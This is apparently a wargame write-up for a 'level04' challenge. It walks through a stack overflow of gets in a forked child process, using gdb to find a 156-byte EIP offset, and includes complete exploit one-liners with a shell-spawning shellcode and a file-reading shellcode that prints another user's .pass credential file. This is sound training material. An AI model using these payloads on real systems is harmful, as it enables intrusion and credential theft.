### step 1: Decompile with Ghidra

We get the c source code of the program  

### step 2: Code analysis

- We find only a `main` function 
- In this function we find a vulnerable `gets` function which is not protected and that we will overflow.
- We don't find any `system` function calls so we plan to use a shellcode
- Finally we have a child process launched and it is in this process that the `gets` function is called

### step 3 : find the overflow 

Important:  
Since we have a parent and a child process we use the gdb command  `set follow-fork-mode child` to set gdb in `follow-child` mode  

- We check that we can overflow the EIP in the child process by feeding a lot of `a` characters, then check the EIP value with the command `info frame` at a breakpoint just after the `gets` call => it is filled with 61616161 corresponding to our `a` char  

```
(gdb) r
Starting program: /home/users/level04/level04 
[New process 2171]
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[Switching to process 2171]

Breakpoint 1, 0x08048763 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd6f0:
 eip = 0x8048763 in main; saved eip 0x61616161
 Arglist at 0xffffd6e8, args: 
 Locals at 0xffffd6e8, Previous frame's sp is 0xffffd6f0
 Saved registers:
  ebx at 0xffffd6e0, ebp at 0xffffd6e8, edi at 0xffffd6e4, eip at 0xffffd6ec
```

- In order to find the precise Offset we will use a generated string provided by an online generator : https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ 

- Offset String : `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`

```
gdb level04
set follow-fork-mode child
b *0x08048763
r
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
info frame
Stack level 0, frame at 0xffffd6f0:
 eip = 0x8048763 in main; saved eip 0x41326641
 Arglist at 0xffffd6e8, args: 
 Locals at 0xffffd6e8, Previous frame's sp is 0xffffd6f0
 Saved registers:
  ebx at 0xffffd6e0, ebp at 0xffffd6e8, edi at 0xffffd6e4, eip at 0xffffd6ec
```

- We get the offset by providing our overwritten EIP `0x41326641` to the generator : 

=> We find the Offset : `156` We find that the overflow is at the 156th character


### step 4 : setup the exploit

Since we now the overflow position we setup our usual shellcode :

( python -c 'print("A" * 156 + "\xae\xde\xff\xff")' ; cat ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level04

However this exploit does not work because doesn't work because it switches to the parent process. Even if a shell is launched, we can't access it because the fork leads us to the parent process.

### step 5 : Use a cat shellcode for the final exploit 

D'habitude on utilise le shellcode pour lancer un bash,
Usually we use a sellcode which launches a shell. This time we will use a `cat` shellcode.

Here is a register with many shellcodes for many functions and architectures : https://shell-storm.org/shellcode/index.html

The cat shellcode which we will use : https://shell-storm.org/shellcode/files/shellcode-73.html

We add at the end of this shellcode the pass path and then we have the final exploit which will print us the .pass file :
```
( python -c 'print("A" * 156 + "\xae\xde\xff\xff")' ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 +  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass")') ./level04
```

